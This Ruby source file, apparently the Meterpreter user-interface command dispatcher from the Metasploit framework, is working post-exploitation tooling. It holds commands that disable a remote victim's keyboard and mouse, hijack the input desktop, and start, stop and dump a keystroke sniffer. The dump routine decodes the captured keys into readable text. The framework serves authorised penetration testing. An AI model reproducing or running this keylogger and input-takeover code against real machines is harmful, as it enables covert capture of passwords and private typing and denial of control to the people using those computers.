require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The user interface portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Ui

	Klass = Console::CommandDispatcher::Stdapi::Ui

	include Console::CommandDispatcher

	#
	# List of supported commands.
	#
	def commands
		{
			"idletime"      => "Returns the number of seconds the remote user has been idle",
			"uictl"         => "Control some of the user interface components",
			"grabdesktop"   => "Take over the active input desktop (needed for keyboard sniffing)",
			"keyscan_start" => "Start capturing keystrokes",
			"keyscan_stop"  => "Stop capturing keystrokes",
			"keyscan_dump"  => "Dump they keystroke buffer"
		}
	end

	#
	# Name for this dispatcher.
	#
	def name
		"Stdapi: User interface"
	end

	#
	# Executes a command with some options.
	#
	def cmd_idletime(*args)
		seconds = client.ui.idle_time

		print_line(
			"User has been idle for: #{Rex::ExtTime.sec_to_s(seconds)}")
		
		return true
	end

	#
	# Enables/disables user interface mice and keyboards on the remote machine.
	#
	def cmd_uictl(*args)
		if (args.length < 2)
			print_line(
				"Usage: uictl [enable/disable] [keyboard/mouse]")
			return true
		end

		case args[0]
			when 'enable'
				case args[1]
					when 'keyboard'
						print_line("Enabling keyboard...")
						client.ui.enable_keyboard
					when 'mouse'
						print_line("Enabling mouse...")
						client.ui.enable_mouse
					else
						print_error("Unsupported user interface device: #{args[1]}")
				end
			when 'disable'
				case args[1]
					when 'keyboard'
						print_line("Disabling keyboard...")
						client.ui.disable_keyboard
					when 'mouse'
						print_line("Disabling mouse...")
						client.ui.disable_mouse
					else
						print_error("Unsupported user interface device: #{args[1]}")
				end
			else
				print_error("Unsupported command: #{args[0]}")
		end

		return true
	end
	
	#
	# Hijack the input desktop
	#
	def cmd_grabdesktop(*args)
		print_line("Trying to hijack the input desktop...")
		client.ui.grab_desktop
		return true
	end	

	#
	# Start the keyboard sniffer
	#
	def cmd_keyscan_start(*args)
		print_line("Starting the keystroke sniffer...")	
		client.ui.keyscan_start
		return true
	end	
	
	#
	# Stop the keyboard sniffer
	#
	def cmd_keyscan_stop(*args)
		print_line("Stopping the keystroke sniffer...")		
		client.ui.keyscan_stop
		return true
	end	

	#
	# Dump captured keystrokes
	#
	def cmd_keyscan_dump(*args)
		print_line("Dumping captured keystrokes...")			
		data = client.ui.keyscan_dump
		outp = ""
		data.unpack("n*").each do |inp|
			fl = (inp & 0xff00) >> 8
			vk = (inp & 0xff)
			kc = VirtualKeyCodes[vk]
			
			f_shift = fl & (1<<1)
			f_ctrl  = fl & (1<<2)
			f_alt   = fl & (1<<3)
	
			if(kc)
				name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
				case name
				when /^.$/
					outp << name
				when /shift|click/i
				when 'Space'
					outp << " "
				else
					outp << " <#{name}> "
				end
			else
				outp << " <0x%.2x> " % vk
			end
		end
		print_line(outp)
		
		return true
	end	
			
end

end
end
end
end
